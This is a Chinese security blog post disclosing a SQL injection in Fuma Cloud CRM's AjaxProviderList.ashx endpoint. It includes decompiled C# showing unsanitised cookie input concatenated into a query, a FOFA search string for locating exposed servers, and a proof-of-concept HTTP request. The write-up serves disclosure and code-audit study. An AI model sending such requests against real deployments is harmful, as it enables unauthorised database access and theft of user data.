---
title: "孚盟云CRM AjaxProviderList.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxProviderList-sqli.html
asset_dir: assets/孚盟云crm-ajaxproviderlist.ashx-sql注入漏洞
---

# 孚盟云CRM AjaxProviderList.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/25 08:31
* 223浏览
* [0评论](#comment)
* 19分钟阅读

深入探索

网络安全会议

安全研究工具

服务器安全服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxProviderList.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `AjaxProviderList.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxProviderList** 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  if (string.IsNullOrEmpty(UserCookie.GetCookieValue("empId")))
    return;
  this.empId = UserCookie.GetCookieValue("empId");
  this.empId = FumaCRM_BS.Utility.Encrypt.Encrypt.DesDecrypt(this.empId);
  string str = context.Request["method"].ToString();
  if (!string.op_Equality(str, "more"))
  {
    if (!string.op_Equality(str, "showSate"))
    {
      if (!string.op_Equality(str, "search"))
      {
        if (!string.op_Equality(str, "SendMessage"))
          return;
        this.SendMessage(context, this.empId);
      }
      else
        this.search(context, this.empId);
    }
    else
      this.showSate(context, this.empId);
  }
  else
    this.more(context, this.empId);
}
```

深入探索

文本剥离工具

漏洞扫描服务

VPN服务

当**method=SendMessage**时，进入`SendMessage`方法

```
private void SendMessage(HttpContext context, string empID)
{
  string str1 = context.Request["cid"];
  string str2 = context.Request["FID"];
  string str3 = context.Request["agentId"];
  string str4 = context.Request["url"];
  JsonSerializerSettings settings = new JsonSerializerSettings()
  {
    NullValueHandling = NullValueHandling.Ignore
  };
  string str5 = new CreatePageDao().GetDataSource($"select Dingding from bfEMP where EmpID='{empID}'").Rows[0][0].ToString();
```

参数`empID`被直接拼接进SQL语句中执行，期间无过滤或校验，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxProviderList.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"'SQLI_POC--","corpId": "1"}
Content-Type: application/x-www-form-urlencoded

method=SendMessage
```

[![孚盟云CRM AjaxProviderList.ashx SQL注入漏洞](images/img-001-661e8527e239.webp)](https://image.mrxn.net/2fccc5d3e73148698decc4a95b6a1af7.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM AjaxProviderList.ashx SQL注入漏洞](https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxProviderList-sqli.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxProviderList-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

代码安全审计

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxProviderList-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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